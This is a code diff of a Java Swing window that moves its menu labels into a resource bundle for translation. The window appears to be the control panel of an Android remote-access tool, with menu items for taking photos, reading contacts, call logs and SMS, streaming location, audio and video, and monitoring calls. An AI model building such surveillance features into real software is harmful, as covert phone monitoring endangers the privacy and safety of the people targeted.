@@ -47,8 +47,10 @@ import java.util.HashSet;
 import javax.swing.JSplitPane;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
+import java.util.ResourceBundle;
 
 public class UserGUI extends JFrame implements WindowListener {
+	private static final ResourceBundle BUNDLE = ResourceBundle.getBundle("gui.messages"); //$NON-NLS-1$
 	
 	private JPanel contentPane;
 	private JTabbedPane tabbedPane;
@@ -498,17 +500,17 @@ public class UserGUI extends JFrame implements WindowListener {
 		JMenuBar menuBar = new JMenuBar();
 		setJMenuBar(menuBar);
 		
-		JMenu mnOptions = new JMenu("Options");
+		JMenu mnOptions = new JMenu(BUNDLE.getString("Options")); //$NON-NLS-1$
 		menuBar.add(mnOptions);
 		
-		JMenuItem mntmCloseInterface = new JMenuItem("Close Window");
+		JMenuItem mntmCloseInterface = new JMenuItem(BUNDLE.getString("Close-Window")); //$NON-NLS-1$
 		mntmCloseInterface.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonFinish();
 			}
 		});
 		
-		JMenuItem mntmCloseTabViewer = new JMenuItem("Close Tab");
+		JMenuItem mntmCloseTabViewer = new JMenuItem(BUNDLE.getString("Close-Tab")); //$NON-NLS-1$
 		mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R, InputEvent.CTRL_MASK));
 		mntmCloseTabViewer.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -518,10 +520,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		mnOptions.add(mntmCloseTabViewer);
 		mnOptions.add(mntmCloseInterface);
 		
-		JMenu mnRcuprationDeDonnes = new JMenu("Get Android data");
+		JMenu mnRcuprationDeDonnes = new JMenu(BUNDLE.getString("Get-data")); //$NON-NLS-1$
 		menuBar.add(mnRcuprationDeDonnes);
 		
-		JMenuItem mntmPrendrePhoto = new JMenuItem("Take picture");
+		JMenuItem mntmPrendrePhoto = new JMenuItem(BUNDLE.getString("Take-pic")); //$NON-NLS-1$
 		mnRcuprationDeDonnes.add(mntmPrendrePhoto);
 		mntmPrendrePhoto.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -529,7 +531,7 @@ public class UserGUI extends JFrame implements WindowListener {
 			}
 		});
 		
-		JMenuItem mntmFileTree = new JMenuItem("File tree");
+		JMenuItem mntmFileTree = new JMenuItem(BUNDLE.getString("File-tree")); //$NON-NLS-1$
 		mnRcuprationDeDonnes.add(mntmFileTree);
 		mntmFileTree.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -537,7 +539,7 @@ public class UserGUI extends JFrame implements WindowListener {
 			}
 		});
 		
-		JMenuItem mntmContacts = new JMenuItem("Contacts");
+		JMenuItem mntmContacts = new JMenuItem(BUNDLE.getString("Contacts")); //$NON-NLS-1$
 		mnRcuprationDeDonnes.add(mntmContacts);
 		mntmContacts.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -545,7 +547,7 @@ public class UserGUI extends JFrame implements WindowListener {
 			}
 		});
 		
-		JMenuItem mntmCallLogs = new JMenuItem("Call logs");
+		JMenuItem mntmCallLogs = new JMenuItem(BUNDLE.getString("Call-logs")); //$NON-NLS-1$
 		mnRcuprationDeDonnes.add(mntmCallLogs);
 		mntmCallLogs.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -553,7 +555,7 @@ public class UserGUI extends JFrame implements WindowListener {
 			}
 		});
 		
-		JMenuItem mntmSms = new JMenuItem("SMS");
+		JMenuItem mntmSms = new JMenuItem(BUNDLE.getString("SMS")); //$NON-NLS-1$
 		mntmSms.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				fireButtonSMS();
@@ -561,10 +563,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnRcuprationDeDonnes.add(mntmSms);
 		
-		JMenu mnStreaming = new JMenu("Streaming");
+		JMenu mnStreaming = new JMenu(BUNDLE.getString("other")); //$NON-NLS-1$
 		mnRcuprationDeDonnes.add(mnStreaming);
 		
-		JMenuItem mntmCoordonnesGps = new JMenuItem("Localisation");
+		JMenuItem mntmCoordonnesGps = new JMenuItem(BUNDLE.getString("Localisation")); //$NON-NLS-1$
 		mntmCoordonnesGps.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonStreamingGPS();
@@ -572,7 +574,7 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnStreaming.add(mntmCoordonnesGps);
 		
-		JMenuItem mntmSon = new JMenuItem("Audio");
+		JMenuItem mntmSon = new JMenuItem(BUNDLE.getString("Audio")); //$NON-NLS-1$
 		mntmSon.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonStreamingSound();
@@ -580,7 +582,7 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnStreaming.add(mntmSon);
 		
-		JMenuItem mntmVido = new JMenuItem("Video");
+		JMenuItem mntmVido = new JMenuItem(BUNDLE.getString("Video")); //$NON-NLS-1$
 		mntmVido.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonStreamingVideo();
@@ -588,10 +590,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnStreaming.add(mntmVido);
 		
-		JMenu mnEnvoiDeCommandes = new JMenu("Send command");
+		JMenu mnEnvoiDeCommandes = new JMenu(BUNDLE.getString("Send-command")); //$NON-NLS-1$
 		menuBar.add(mnEnvoiDeCommandes);
 		
-		JMenuItem mntmSendToastMessage = new JMenuItem("Toast message");
+		JMenuItem mntmSendToastMessage = new JMenuItem(BUNDLE.getString("Toast-message")); //$NON-NLS-1$
 		mntmSendToastMessage.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonToastMessage();
@@ -599,7 +601,7 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnEnvoiDeCommandes.add(mntmSendToastMessage);
 		
-		JMenuItem mntmSendSms = new JMenuItem("Send SMS");
+		JMenuItem mntmSendSms = new JMenuItem(BUNDLE.getString("Send-SMS")); //$NON-NLS-1$
 		mntmSendSms.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonSendSMS();
@@ -607,7 +609,7 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnEnvoiDeCommandes.add(mntmSendSms);
 		
-		JMenuItem mntmGiveCall = new JMenuItem("Give call");
+		JMenuItem mntmGiveCall = new JMenuItem(BUNDLE.getString("Give-call")); //$NON-NLS-1$
 		mntmGiveCall.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonGiveCall();
@@ -615,10 +617,10 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnEnvoiDeCommandes.add(mntmGiveCall);
 		
-		JMenu mnMonitoring = new JMenu("Monitoring");
+		JMenu mnMonitoring = new JMenu(BUNDLE.getString("Monitoring")); //$NON-NLS-1$
 		menuBar.add(mnMonitoring);
 		
-		JMenuItem mntmCallMonitor = new JMenuItem("Call monitor");
+		JMenuItem mntmCallMonitor = new JMenuItem(BUNDLE.getString("Call-monitor")); //$NON-NLS-1$
 		mntmCallMonitor.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonMonitorCall();
@@ -626,7 +628,7 @@ public class UserGUI extends JFrame implements WindowListener {
 		});
 		mnMonitoring.add(mntmCallMonitor);
 		
-		JMenuItem mntmSmsMonitor = new JMenuItem("SMS monitor");
+		JMenuItem mntmSmsMonitor = new JMenuItem(BUNDLE.getString("SMS-monitor")); //$NON-NLS-1$
 		mntmSmsMonitor.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				fireButtonMonitorSMS();
